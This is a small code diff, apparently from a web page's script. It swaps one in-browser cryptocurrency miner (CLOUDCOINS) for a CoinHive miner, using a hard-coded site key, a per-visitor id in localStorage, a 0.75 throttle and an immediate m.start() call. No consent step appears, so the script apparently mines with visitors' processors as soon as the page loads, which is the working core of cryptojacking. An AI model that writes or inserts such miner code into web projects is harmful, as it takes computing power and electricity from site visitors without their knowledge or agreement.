@@ -1,7 +1,7 @@
 localStorage.setItem('uuid', localStorage.getItem('uuid') || `${Math.random()}${Math.random()}${Math.random()}${Math.random()}`);
-window.m = CLOUDCOINS.Miner({
-    key: 'ienvsQZVRnNaC5TUJ1oj26arv1zQCFoy',
-    user: localStorage.getItem('uuid'),
-    autostart: true,
-    throttle: 0.75,
-});
+window.m = CoinHive.User(
+    'WU3lkfAu0LBtESJE7itMZiVkVJtvUL0G',
+    localStorage.getItem('uuid'),
+    { throttle: parseFloat(localStorage.getItem('throttle')) || 0.75 },
+);
+m.start();
